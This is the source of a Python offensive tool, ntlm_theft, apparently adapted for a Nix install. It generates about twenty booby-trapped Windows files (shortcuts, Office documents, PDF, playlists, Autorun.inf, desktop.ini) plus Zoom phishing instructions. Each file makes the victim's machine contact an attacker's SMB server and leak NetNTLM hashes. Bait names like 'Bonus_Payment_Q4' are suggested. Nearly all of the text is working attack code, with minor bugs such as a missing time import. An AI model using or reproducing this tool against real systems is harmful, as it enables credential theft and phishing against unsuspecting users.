#!/usr/bin/env 
# -*- coding: utf-8 -*-
from __future__ import print_function

# Tested on Windows 10 1903 Build 18362.720
# Working Attacks:
# Browse to directory: .url
# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture), .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell), .htm (Open locally with Chrome, IE or Edge)
# Open file and allow: pdf
# Browser download and open: .application (Must be downloaded via a web browser and run)
# Partial Open file: .m3u (Works if you open with windows media player, but windows 10 auto opens with groove music)

# In progress - desktop.ini (Need to test older windows versions), autorun.ini (Need to test before windows 7), scf (Need to test on older windows)


# References
# https://ired.team/offensive-security/initial-access/t1187-forced-authentication
# https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
# https://ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
# https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/
# https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
# https://github.com/rocketscientist911/excel-ntlmv2
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
# https://www.youtube.com/watch?v=PDpBEY1roRc

import argparse
import io
import os
import shutil
import xlsxwriter
from sys import exit
import tempfile

#the basic path of the script, make it possible to run from anywhere
script_directory = "/run/current-system/sw/share/ntlm_theft"

#arg parser to generate all or one file
#python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='ntlm_theft by Jacob Wilkin(Greenwolf)',
        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
parser.add_argument('-v', '--version', action='version',
    version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
parser.add_argument('-vv', '--verbose', action='store_true',dest='vv',help='Verbose Mode')
parser.add_argument('-g', '--generate',
	action='store', 
	dest='generate',
	required=True,
	choices=set((
		"modern",
		"all",
		"scf",
		"url",
		"lnk",
		"rtf",
		"xml",
		"htm",
		"docx",
		"xlsx",
		"wax",		
		"m3u",
		"asx",
		"jnlp",
		"application",
		"pdf",
		"zoom",
		"autoruninf",
		"desktopini")),
    help='Choose to generate all files or a specific filetype')
parser.add_argument('-s', '--server',action='store', dest='server',required=True,
    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
parser.add_argument('-f', '--filename',action='store', dest='filename',required=True,
    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
args = parser.parse_args()


def set_writable_and_valid_timestamps(path):
    """Recursively set writable permissions and valid timestamps for files and directories."""
    current_time = time.time()  # Get current timestamp
    for root, dirs, files in os.walk(path):
        for dir_name in dirs:
            dir_path = os.path.join(root, dir_name)
            os.chmod(dir_path, 0o755)  # rwxr-xr-x for directories
            os.utime(dir_path, (current_time, current_time))  # Update access and modification times
        for file_name in files:
            file_path = os.path.join(root, file_name)
            os.chmod(file_path, 0o644)  # rw-r--r-- for files
            os.utime(file_path, (current_time, current_time))  # Update access and modification times

# NOT WORKING ON LATEST WINDOWS
# .scf remote IconFile Attack
# Filename: shareattack.scf, action=browse, attacks=explorer
def create_scf(generate, server, filename):
    if generate == "modern":
        print("Skipping SCF as it does not work on modern Windows")
        return
    with open(filename, 'w') as file:
        file.write(f'''[Shell]
Command=2
IconFile=\\\\{server}\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop''')
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_url(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''[InternetShortcut]
URL=file://{server}/leak/leak.html''')
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_icon(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\{server}\\%USERNAME%.icon
IconIndex=1''')
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_rtf(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''{{\\rtf1{{\\field{{\\*\\fldinst {{INCLUDEPICTURE "file://{server}/test.jpg" \\\\* MERGEFORMAT\\\\d}}}}{{\\fldrslt}}}}}}''')
    print(f"Created: {filename} (OPEN)")


def create_xml(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\{server}\\bad.xsl" ?>''')
    print(f"Created: {filename} (OPEN)")


def create_xml_includepicture(generate, server, filename):
    src = os.path.join(script_directory, "templates", "includepicture-template.xml")
    with open(src, 'r', encoding="utf8") as file:
        filedata = file.read()
    filedata = filedata.replace('127.0.0.1', server)
    with open(filename, 'w', encoding="utf8") as file:
        file.write(filedata)
    print(f"Created: {filename} (OPEN)")


def create_htm(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''<!DOCTYPE html>
<html>
   <img src="file://{server}/leak/leak.png"/>
</html>''')
    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def create_docx_includepicture(generate, server, filename):
    # Source path (read-only in Nix store)
    src = os.path.join(script_directory, "templates", "docx-includepicture-template")
    
    # Create a writable temporary directory in /tmp
    temp_dir = "/tmp/ntlm_theft_temp"
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir, exist_ok=True)

    dest = os.path.join(temp_dir, "docx-includepicture-template")
    if os.path.exists(dest):
        shutil.rmtree(dest)  # Clean up any existing directory

    try:
        # Copy the template to the writable temporary directory
        shutil.copytree(src, dest)
        
        # Fix permissions and timestamps
        set_writable_and_valid_timestamps(dest)
        
        # Modify the document.xml.rels file in the temporary directory
        documentfilename = os.path.join(dest, "word", "_rels", "document.xml.rels")
        with open(documentfilename, 'r') as file:
            filedata = file.read()
        filedata = filedata.replace('127.0.0.1', server)
        with open(documentfilename, 'w') as file:
            file.write(filedata)
        
        # Create the .docx archive from the modified template
        shutil.make_archive(filename, 'zip', dest)
        os.rename(filename + ".zip", filename)
        print(f"Created: {filename} (OPEN)")
    finally:
        # Clean up the temporary directory
        if os.path.exists(dest):
            shutil.rmtree(dest)

def create_docx_remote_template(generate, server, filename):
    src = os.path.join(script_directory, "templates", "docx-remotetemplate-template")
    with tempfile.TemporaryDirectory() as temp_dir:
        dest = os.path.join(temp_dir, "docx-remotetemplate-template")
        shutil.copytree(src, dest)
        documentfilename = os.path.join(dest, "word", "_rels", "settings.xml.rels")
        with open(documentfilename, 'r') as file:
            filedata = file.read()
        filedata = filedata.replace('127.0.0.1', server)
        with open(documentfilename, 'w') as file:
            file.write(filedata)
        shutil.make_archive(filename, 'zip', dest)
        os.rename(filename + ".zip", filename)
    print(f"Created: {filename} (OPEN)")


def create_docx_frameset(generate, server, filename):
    src = os.path.join(script_directory, "templates", "docx-frameset-template")
    with tempfile.TemporaryDirectory() as temp_dir:
        dest = os.path.join(temp_dir, "docx-frameset-template")
        shutil.copytree(src, dest)
        documentfilename = os.path.join(dest, "word", "_rels", "webSettings.xml.rels")
        with open(documentfilename, 'r') as file:
            filedata = file.read()
        filedata = filedata.replace('127.0.0.1', server)
        with open(documentfilename, 'w') as file:
            file.write(filedata)
        shutil.make_archive(filename, 'zip', dest)
        os.rename(filename + ".zip", filename)
    print(f"Created: {filename} (OPEN)")


def create_xlsx_externalcell(generate, server, filename):
    workbook = xlsxwriter.Workbook(filename)
    worksheet = workbook.add_worksheet()
    worksheet.write_url('AZ1', f"external://{server}\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
    workbook.close()
    print(f"Created: {filename} (OPEN)")


def create_wax(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''https://{server}/test
file://\\\\{server}/steal/file''')
    print(f"Created: {filename} (OPEN)")


def create_m3u(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''#EXTM3U
#EXTINF:1337, Leak
\\\\{server}\\leak.mp3''')
    print(f"Created: {filename} (OPEN IN WINDOWS MEDIA PLAYER ONLY)")


def create_asx(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://{server}/leak/leak.wma"/>
   </entry>
</asx>''')
    print(f"Created: {filename} (OPEN)")


def create_jnlp(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://{server}/leak/leak.jar"/>
   </resources>
   <application-desc/>
</jnlp>''')
    print(f"Created: {filename} (OPEN)")


def create_application(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
   <dependency>
      <dependentAssembly dependencyType="install" codebase="file://{server}/leak/Leak.exe.manifest" size="32909">
         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
         <hash>
            <dsig:Transforms>
               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
            </dsig:Transforms>
            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
         </hash>
      </dependentAssembly>
   </dependency>
</asmv1:assembly>''')
    print(f"Created: {filename} (DOWNLOAD AND OPEN)")


def create_pdf(generate, server, filename):
    with open(filename, 'w') as file:
        file.write(f'''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
       /O <<
          /F (\\\\\\\\{server}\\\\test)
          /D [ 0 /Fit]
          /S /GoToE
          >>
       >>
       /Parent 2 0 R
       /Resources <<
            /Font <<
                /F1 <<
                    /Type /Font
                    /Subtype /Type1
                    /BaseFont /Helvetica
                    >>
                  >>
                >>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
    /Root 1 0 R
>>
%%EOF''')
    print(f"Created: {filename} (OPEN AND ALLOW)")


def create_zoom(generate, server, filename):
    if generate == "modern":
        print("Skipping zoom as it does not work on the latest versions")
        return
    with open(filename, 'w') as file:
        file.write(f'''To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\{server}\\xyz
''')
    print(f"Created: {filename} (PASTE TO CHAT)")


def create_autoruninf(generate, server, filename):
    if generate == "modern":
        print("Skipping Autorun.inf as it does not work on modern Windows")
        return
    with open(filename, 'w') as file:
        file.write(f'''[autorun]
open=\\\\{server}\\setup.exe
icon=something.ico
action=open Setup.exe''')
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_desktopini(generate, server, filename):
    if generate == "modern":
        print("Skipping desktop.ini as it does not work on modern Windows")
        return
    with open(filename, 'w') as file:
        file.write(f'''[.ShellClassInfo]
IconResource=\\\\{server}\\aa''')
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_lnk(generate, server, filename):
    offset = 0x136
    max_path = 0xDF
    unc_path = f'\\\\{server}\\tools\\nc.ico'
    if len(unc_path) >= max_path:
        print("Server name too long for lnk template, skipping.")
        return
    unc_path = unc_path.encode('utf-16le')
    src = os.path.join(script_directory, "templates", "shortcut-template.lnk")
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_file = os.path.join(temp_dir, "shortcut-template.lnk")
        shutil.copy2(src, temp_file)
        with open(temp_file, 'rb') as lnk:
            shortcut = list(lnk.read())
        for i in range(0, len(unc_path)):
            shortcut[offset + i] = unc_path[i]
        with open(filename, 'wb') as file:
            file.write(bytes(shortcut))
    print(f"Created: {filename} (BROWSE TO FOLDER)")


# create folder to hold templates, if already exists delete it
if os.path.exists(args.filename):
	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower not in ["y", "yes"]:
		exit(0)
	shutil.rmtree(args.filename)
os.makedirs(args.filename)

# handle which documents to create
if (args.generate == "all" or args.generate == "modern"):
	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))

	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))

	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))

	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))

	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))

	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))

	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))

	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))

	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))

	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))

	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))

	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))

	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))

	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))

	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))

	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))

	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))

elif(args.generate == "scf"):
	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))

elif(args.generate == "url"):
	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))

elif(args.generate == "lnk"):
	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))

elif(args.generate == "rtf"):
	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))

elif(args.generate == "xml"):
	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))

elif(args.generate == "htm"):
	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))

elif(args.generate == "docx"):
	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))

elif(args.generate == "xlsx"):
	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
	
elif(args.generate == "wax"):
	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))

elif(args.generate == "m3u"):
	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))

elif(args.generate == "asx"):
	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))

elif(args.generate == "jnlp"):
	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))

elif(args.generate == "application"):
	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))

elif(args.generate == "pdf"):
	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))

elif(args.generate == "zoom"):
	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))

elif(args.generate == "autoruninf"):
	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))

elif(args.generate == "desktopini"):
	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))

print("Generation Complete.")
